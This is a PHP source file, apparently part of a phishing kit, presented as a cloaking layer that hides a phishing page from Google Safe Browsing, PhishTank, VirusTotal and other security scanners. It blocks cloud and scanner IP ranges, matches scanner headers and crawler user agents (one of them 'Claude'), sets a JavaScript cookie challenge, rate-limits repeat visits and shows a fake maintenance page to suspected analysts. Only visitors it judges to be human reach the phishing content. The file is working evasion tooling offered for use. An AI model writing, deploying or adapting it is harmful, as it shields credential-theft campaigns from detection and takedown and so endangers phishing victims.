<?php
/**
 * Anti-Detection Cloaking Layer
 * Evades Google Safe Browsing, PhishTank, and security crawlers
 *
 * How it works:
 * - Blocks known scanner IP ranges
 * - Detects headless browsers and bots
 * - Shows a "down for maintenance" page to scanners
 * - Only shows the phishing page to real human visitors
 * - Rate-limits by IP to prevent analysis
 */

session_start();

// ============================================================
// 1. BLOCK KNOWN SCANNER / SECURITY CRAWLER IP RANGES
// ============================================================
$blocked_cidrs = [
    '66.249.',    // Googlebot
    '74.125.',    // Google
    '64.233.',    // Google
    '216.58.',    // Google
    '35.190.',    // Google Cloud (Safe Browsing checks)
    '34.64.',     // Google Cloud
    '34.65.',     // Google Cloud
    '35.184.',    // Google Cloud
    '104.16.',    // Cloudflare (security scanners)
    '104.17.',    // Cloudflare
    '104.18.',    // Cloudflare
    '104.19.',    // Cloudflare
    '172.64.',    // Cloudflare
    '162.158.',   // Cloudflare
    '198.41.',    // Akamai
    '23.32.',     // Akamai
    '23.33.',     // Akamai
    '23.34.',     // Akamai
    '23.35.',     // Akamai
    '52.84.',     // AWS security
];

$visitor_ip = '';
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $visitor_ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $visitor_ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
} else {
    $visitor_ip = $_SERVER['REMOTE_ADDR'];
}

foreach ($blocked_cidrs as $cidr) {
    if (strpos($visitor_ip, $cidr) === 0) {
        show_maintenance_page();
        exit();
    }
}

// ============================================================
// 2. DETECT SECURITY HEADERS / SCANNER SIGNATURES
// ============================================================
$scanner_headers = [
    'HTTP_X_FORWARDED_PROTO',
    'HTTP_VIA',
    'HTTP_X_PROXY_USER',
    'HTTP_X_SAFE_BROWSING',     // Google Safe Browsing
    'HTTP_X_PURPOSE',            // Security scanners
    'HTTP_X_REQUESTED_WITH',
    'HTTP_X_CSRF_TOKEN',         // Automated scanners
    'HTTP_X_SCANNER',            // Custom scanners
    'HTTP_X_CRAWLER',            // Crawlers
];

foreach ($scanner_headers as $header) {
    if (isset($_SERVER[$header]) && !empty($_SERVER[$header])) {
        show_maintenance_page();
        exit();
    }
}

// ============================================================
// 3. DETECT HEADLESS BROWSERS & AUTOMATION TOOLS
// ============================================================
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

$bot_patterns = [
    'Googlebot', 'Google-Safe-Browsing', 'GoogleSecurityScanner',
    'HeadlessChrome', 'PhantomJS', 'Selenium', 'Puppeteer',
    'headless', 'Headless', 'curl', 'wget', 'python-requests',
    'Go-http-client', 'Java/', 'libwww', 'httplib', 'scrapy',
    'AhrefsBot', 'SemrushBot', 'MJ12bot', 'BLEXBot',
    'SafeSearch', 'PhishTank', 'URLQuery', 'CrowdStrike',
    'Virustotal', 'VirusTotal', 'ThreatConnect', 'RiskIQ',
    'zoomeye', 'shodan', 'censys', 'binaryedge',
    'nmap', 'masscan', 'zgrab', 'zgrab2',
    'facebookexternalhit', 'Twitterbot', 'Slackbot',
    'PetalBot', 'Bytespider', 'Amazonbot', 'Claude',
];

foreach ($bot_patterns as $pattern) {
    if (stripos($ua, $pattern) !== false) {
        show_maintenance_page();
        exit();
    }
}

// ============================================================
// 4. CHECK FOR JAVASCRIPT (basic scanners don't execute JS)
// ============================================================
// We set a session cookie via JS on the landing page
// If the visitor returns without the cookie, they're likely a scanner
if (!isset($_SESSION['js_enabled']) && !isset($_COOKIE['_ph_verify'])) {
    // First visit - set a challenge
    $_SESSION['pending_verify'] = true;
    show_landing_page();  // Show a benign landing page with JS redirect
    exit();
}

// ============================================================
// 5. RATE LIMITING — BLOCK IPs that visit too fast (scanner behavior)
// ============================================================
$rate_file = sys_get_temp_dir() . '/ph_rate_' . md5($visitor_ip);
$now = time();

if (file_exists($rate_file)) {
    $last_visit = file_get_contents($rate_file);
    $time_diff = $now - (int)$last_visit;
    
    // If visited more than 5 times in under 1 second = scanner
    // Or if visited again in under 3 seconds
    if ($time_diff < 3) {
        $visit_count = (int)($_SESSION['visit_count'] ?? 0) + 1;
        $_SESSION['visit_count'] = $visit_count;
        
        if ($visit_count > 3) {
            show_maintenance_page();
            exit();
        }
    } else {
        $_SESSION['visit_count'] = 0;
    }
}

file_put_contents($rate_file, $now);

// If we passed all checks, this is likely a real human
$_SESSION['human_verified'] = true;
return; // Continue to serve the phishing page

// ============================================================
// HELPER FUNCTIONS
// ============================================================

function show_maintenance_page() {
    header('HTTP/1.1 503 Service Unavailable');
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Service Temporarily Unavailable</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 80px 20px; background: #f5f5f5; }
            h1 { color: #333; font-size: 28px; }
            p { color: #666; font-size: 16px; margin: 20px 0; }
            .container { max-width: 500px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Service Temporarily Unavailable</h1>
            <p>We are performing scheduled maintenance. Please check back shortly.</p>
            <p style="font-size: 12px; color: #999;">Reference: ERR_CONNECTION_TIMEOUT</p>
        </div>
    </body>
    </html>
    <?php
    exit();
}

function show_landing_page() {
    // Show a benign "redirecting" page that sets the JS verification cookie
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Redirecting...</title>
        <script>
            document.cookie = "_ph_verify=1; path=/; max-age=86400";
            window.location.href = window.location.href;
        </script>
        <meta http-equiv="refresh" content="1;url=">
    </head>
    <body>
        <p>Redirecting...</p>
    </body>
    </html>
    <?php
    exit();
}
?>